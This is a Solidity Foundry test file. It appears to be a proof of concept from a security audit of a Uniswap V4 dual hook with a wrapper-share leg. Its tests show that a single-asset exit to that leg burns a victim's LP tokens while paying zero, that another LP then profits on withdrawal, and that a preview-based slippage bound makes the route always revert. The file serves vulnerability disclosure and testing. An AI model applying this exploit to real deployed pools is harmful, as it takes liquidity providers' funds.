// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC20Metadata} from "@crane/contracts/interfaces/IERC20Metadata.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IFacet} from "@crane/contracts/interfaces/IFacet.sol";
import {ICreate3FactoryProxy} from "@crane/contracts/interfaces/proxies/ICreate3FactoryProxy.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";

import {TestBase_UniswapV4DualSEBCPHook as TestBase} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/dual/TestBase_UniswapV4DualSEBCPHook.sol";
import {
    IUniswapV4DualStandardExchangeBufferConstantProductHookPackage as IPkg
} from "contracts/hooks/uniswap/v4/standardExchange/dual/interfaces/IUniswapV4DualStandardExchangeBufferConstantProductHookPackage.sol";
import {
    IUniswapV4DualStandardExchangeBufferConstantProductHook as IDualHook
} from "contracts/hooks/uniswap/v4/standardExchange/dual/interfaces/IUniswapV4DualStandardExchangeBufferConstantProductHook.sol";
import {IRebasingAwareERC4626DFPkg} from "contracts/protocols/staking/rebasingVault/IRebasingAwareERC4626DFPkg.sol";
import {RebasingAwareERC4626_Component_FactoryService} from
    "contracts/protocols/staking/rebasingVault/RebasingAwareERC4626_Component_FactoryService.sol";
import {IVaultRegistryDeployment} from "contracts/interfaces/IVaultRegistryDeployment.sol";

interface IExitSingle {
    function exitSingleAssetExactBptIn(address tokenOut, uint256 sharesIn, address to, uint256 amountOutMin, uint256 deadline)
        external returns (uint256);
    function previewExitSingleAssetExactBptIn(address tokenOut, uint256 sharesIn) external view returns (uint256);
    function previewExitProportional(uint256 shares) external view returns (uint256[] memory amounts);
}

/// PoC: DUAL hook with identity (wrapper-share) leg. Composed single-asset exit to the identity leg
/// pays 0 while burning the caller's LP; value accrues to remaining LPs. With a preview-derived
/// minimum the route always reverts (DoS).
contract DualIdentityOutlegZero_PoC is TestBase {
    IERC4626 internal wrapper;
    address internal wHook;
    IDualHook internal wDual;
    address internal c0;
    address internal c1;

    address internal attacker = makeAddr("attackerLP");
    address internal victim = makeAddr("victimLP");

    uint256 internal lpA;
    uint256 internal lpV;

    function setUp() public override {
        super.setUp();
        wrapper = _deployWrapper(IERC20Metadata(address(tokenA)), bytes32(uint256(77)));
        IPkg.PkgArgs memory args = _defaultPkgArgs();
        args.standardExchange0 = address(wrapper);
        args.token0 = address(wrapper);
        wHook = _deployBootstrapOnly(args);
        _ensureProductDoorsAndFinalize(wHook, args.token0, args.token1);
        wDual = IDualHook(wHook);
        c0 = wDual.currency0();
        c1 = wDual.currency1();
        console2.log("currency0", c0);
        console2.log("currency1", c1);
        console2.log("wrapper  ", address(wrapper));

        // Honest LPs: attacker (earlier LP) and victim deposit balanced, equal-size positions.
        lpA = _fundAndDeposit(attacker, 100 ether);
        lpV = _fundAndDeposit(victim, 100 ether);
        console2.log("lpA", lpA);
        console2.log("lpV", lpV);
    }

    function _fundAndDeposit(address who, uint256 amt) internal returns (uint256 lp) {
        tokenA.mint(who, amt);
        tokenB.mint(who, amt);
        vm.startPrank(who);
        IERC20(address(tokenA)).approve(address(wrapper), type(uint256).max);
        uint256 shares = wrapper.deposit(amt, who);
        IERC20(c0).approve(wHook, type(uint256).max);
        IERC20(c1).approve(wHook, type(uint256).max);
        uint256 a0 = c0 == address(wrapper) ? shares : amt;
        uint256 a1 = c1 == address(wrapper) ? shares : amt;
        uint256 hb = _holdings(who);
        (lp,,) = wDual.deposit(a0, a1, who, 0, block.timestamp + 1 hours);
        vm.stopPrank();
        console2.log("deposited value (tokenA-eq), lp", hb - _holdings(who), lp);
        console2.log("  claim right after deposit", _value(IExitSingle(wHook).previewExitProportional(lp)));
    }

    /// value of (wrapper shares, tokenB) in tokenA-equivalent units (pool price 1:1, wrapper ~1:1 assets)
    function _value(uint256[] memory amts) internal view returns (uint256) {
        uint256 wIdx = c0 == address(wrapper) ? 0 : 1;
        return wrapper.convertToAssets(amts[wIdx]) + amts[1 - wIdx];
    }

    function _holdings(address who) internal view returns (uint256) {
        return wrapper.convertToAssets(IERC20(address(wrapper)).balanceOf(who)) + IERC20(address(tokenB)).balanceOf(who);
    }

    function test_identityOutLeg_minZero_paysZero_burnsLP_attackerCaptures() public {
        IExitSingle h = IExitSingle(wHook);
        uint256 attackerClaimBefore = _value(h.previewExitProportional(lpA));
        uint256 victimClaim = _value(h.previewExitProportional(lpV));
        uint256 pred = h.previewExitSingleAssetExactBptIn(address(wrapper), lpV);
        console2.log("victim proportional claim (tokenA-eq)", victimClaim);
        console2.log("victim preview single-asset out (wrapper shares)", pred);
        assertGt(pred, 0, "preview nonzero");

        // DoS form: a sane slippage bound always reverts.
        vm.prank(victim);
        vm.expectRevert();
        h.exitSingleAssetExactBptIn(address(wrapper), lpV, victim, pred * 99 / 100, block.timestamp + 1 hours);

        uint256 vHoldBefore = _holdings(victim);
        uint256 hookW0 = IERC20(address(wrapper)).balanceOf(wHook);
        uint256 supply0 = IERC20(wHook).totalSupply();

        // Victim / integrator exits with min=0.
        vm.prank(victim);
        uint256 got = h.exitSingleAssetExactBptIn(address(wrapper), lpV, victim, 0, block.timestamp + 1 hours);
        uint256 vHoldAfter = _holdings(victim);
        console2.log("victim amountOut returned", got);
        console2.log("victim holdings delta", vHoldAfter - vHoldBefore);
        console2.log("victim LP after", IERC20(wHook).balanceOf(victim));
        console2.log("hook wrapper bal before/after", hookW0, IERC20(address(wrapper)).balanceOf(wHook));
        console2.log("LP supply before/after", supply0, IERC20(wHook).totalSupply());

        assertEq(got, 0, "paid zero");
        assertEq(IERC20(wHook).balanceOf(victim), 0, "LP burned");
        assertLe(vHoldAfter - vHoldBefore, 1, "victim received nothing");

        // Attacker (remaining LP, unprivileged) exits proportionally and realizes the windfall.
        uint256 attackerClaimAfter = _value(h.previewExitProportional(lpA));
        uint256 aHoldBefore = _holdings(attacker);
        vm.prank(attacker);
        wDual.withdraw(lpA, attacker, 0, 0, block.timestamp + 1 hours);
        uint256 realized = _holdings(attacker) - aHoldBefore;
        console2.log("attacker claim before victim exit", attackerClaimBefore);
        console2.log("attacker claim after victim exit ", attackerClaimAfter);
        console2.log("attacker realized on withdraw    ", realized);
        int256 profit = int256(realized) - int256(attackerClaimBefore);
        console2.log("attacker profit (tokenA-eq)");
        console2.logInt(profit);
        console2.log("victim loss (tokenA-eq)", victimClaim);

        assertGt(profit, 0, "attacker profit");
        assertGt(uint256(profit), victimClaim * 95 / 100, "profit ~ victim loss");
    }

    function test_identityOutLeg_exchangeIn_LPtoWrapper_paysZero() public {
        IExitSingle h = IExitSingle(wHook);(uint256 pred,) = IStandardExchangeIn(wHook).previewExchangeIn(IERC20(wHook), lpV, IERC20(address(wrapper)));
        console2.log("exchangeIn preview LP->wrapper", pred);
        assertGt(pred, 0);
        uint256 vHoldBefore = _holdings(victim);
        vm.prank(victim);(uint256 got,) = IStandardExchangeIn(wHook).exchangeIn(IERC20(wHook), lpV, IERC20(address(wrapper)), 0, victim, false, block.timestamp + 1 hours
        );
        console2.log("exchangeIn got", got);
        assertEq(got, 0);
        assertEq(IERC20(wHook).balanceOf(victim), 0);
        assertLe(_holdings(victim) - vHoldBefore, 1);
        h; // silence
    }

    /// Control: exiting to the non-identity leg pays correctly.
    function test_control_nonIdentityOutLeg_pays() public {
        IExitSingle h = IExitSingle(wHook);
        uint256 pred = h.previewExitSingleAssetExactBptIn(address(tokenB), lpV);
        vm.prank(victim);
        uint256 got = h.exitSingleAssetExactBptIn(address(tokenB), lpV, victim, pred * 99 / 100, block.timestamp + 1 hours);
        console2.log("control tokenB pred/got", pred, got);
        assertGt(got, 0);
    }

    function _deployWrapper(IERC20Metadata asset, bytes32 salt) internal returns (IERC4626) {
        IFacet erc4626F = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareERC4626Facet(create3Factory);
        IFacet seF = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareStandardExchangeFacet(create3Factory);
        IFacet syF = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareStandardYieldFacet(create3Factory);
        IFacet metaF = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareVaultMetadataFacet(create3Factory);
        IFacet quoteF = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareStandardExchangeQuoteFacet(create3Factory);
        vm.prank(owner);
        IRebasingAwareERC4626DFPkg wpkg = RebasingAwareERC4626_Component_FactoryService.deployRebasingAwareERC4626DFPkg(
            indexedexManager,
            IRebasingAwareERC4626DFPkg.PkgInit({
                erc20Facet: erc20Facet,
                rebasingAwareErc4626Facet: erc4626F,
                diamondFactory: diamondPackageFactory,
                standardExchangeFacet: seF,
                standardYieldFacet: syF,
                vaultMetadataFacet: metaF,
                transitionQuoteFacet: quoteF,
                vaultRegistry: IVaultRegistryDeployment(address(indexedexManager))
            })
        );
        return wpkg.deployVault(asset, 10, salt);
    }
}
